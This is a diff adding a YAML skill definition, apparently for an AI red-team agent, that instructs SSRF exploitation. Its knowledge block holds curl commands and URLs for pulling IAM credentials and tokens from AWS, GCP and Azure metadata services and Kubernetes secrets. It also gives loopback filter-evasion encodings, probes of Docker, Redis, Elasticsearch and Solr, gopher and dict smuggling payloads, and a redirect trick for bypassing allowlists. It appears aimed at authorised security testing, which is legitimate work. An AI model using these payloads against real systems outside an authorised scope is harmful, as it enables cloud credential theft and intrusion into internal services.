@@ -1,0 +1,71 @@
+schema_version: 1
+version: 3.0.0
+name: ssrf
+description: Senior Server-Side Request Forgery assessment — cloud metadata extraction (AWS IMDSv1/v2, GCP, Azure, K8s), internal loopback bypasses, and protocol smuggling.
+triggers:
+  - ssrf
+  - server-side request forgery
+  - request forgery
+  - metadata
+  - imdsv1
+  - imdsv2
+  - 169.254.169.254
+  - webhook
+  - fetch
+  - proxy
+  - url parameter
+  - gopher
+tools:
+  - curl
+knowledge: |
+  Assess Server-Side Request Forgery (SSRF) with senior red-team precision, targeting cloud metadata, control planes, and internal service fabrics.
+
+  1. HIGH-VALUE CLOUD & PLATFORM METADATA ENDPOINTS:
+     - AWS EC2 (IMDSv1 — Unauthenticated):
+       `http://169.254.169.254/latest/meta-data/`
+       Target credentials: `/latest/meta-data/iam/security-credentials/<role_name>`
+       Target user data (secrets/keys): `/latest/user-data`
+     - AWS EC2 (IMDSv2 — Session Token Required):
+       When direct GET is blocked with 401:
+       Step 1: Request token: `curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+       Step 2: Access metadata: `curl -s -H "X-aws-ec2-metadata-token: <TOKEN>" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
+     - Google Cloud Platform (GCP):
+       `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
+       MANDATORY Header: `Metadata-Flavor: Google`
+     - Microsoft Azure:
+       `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
+       MANDATORY Header: `Metadata: true`
+     - Kubernetes API & Pod Identity:
+       Check `https://kubernetes.default.svc/api/v1/namespaces/default/secrets` using service account tokens.
+
+  2. LOOPBACK & IP FILTER EVASION TECHNIQUES:
+     When filters reject `127.0.0.1` or `localhost`, systematically test numerical and notation equivalents:
+     • Truncated notation: `http://127.1`
+     • Dword / Integer format: `http://2130706433` (computed as (127*256^3)+1)
+     • Hexadecimal format: `http://0x7f000001`
+     • IPv6 loopback: `http://[::1]` or `http://[0000::1]`
+     • IPv4-mapped IPv6: `http://[::ffff:127.0.0.1]`
+     • DNS resolution bypass: `http://127.0.0.1.nip.io`
+
+  3. INTERNAL SERVICE PROBING (Loopback Fabric):
+     Target common unauthenticated internal listening daemons:
+     • Docker Engine API: `http://127.0.0.1:2375/v1.24/containers/json`
+     • Redis: `http://127.0.0.1:6379/` or via gopher protocol
+     • Elasticsearch: `http://127.0.0.1:9200/_cat/indices`
+     • Apache Solr: `http://127.0.0.1:8983/solr/admin/cores`
+
+  4. PROTOCOL SMUGGLING (GOPHER & DICT):
+     When the backend URL fetcher supports alternative schemes:
+     • Gopher to craft arbitrary TCP streams:
+       `gopher://127.0.0.1:6379/_CONFIG%20GET%20dir%0D%0AQUIT`
+     • Dict protocol to probe internal services: `dict://127.0.0.1:11211/stat`
+
+  5. 302 REDIRECT CHAINING (Filter Pre-Check Bypass):
+     When input validation validates destination IP before the HTTP request is dispatched:
+     • Point the vulnerable parameter to an external server under test control that returns an HTTP 302 redirect pointing to `http://169.254.169.254/` or `http://127.0.0.1:2375/`.
+     • If the client library follows redirects automatically, it bypasses the initial allowlist check.
+references:
+  - persona:ssrf-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/ssrf.yaml
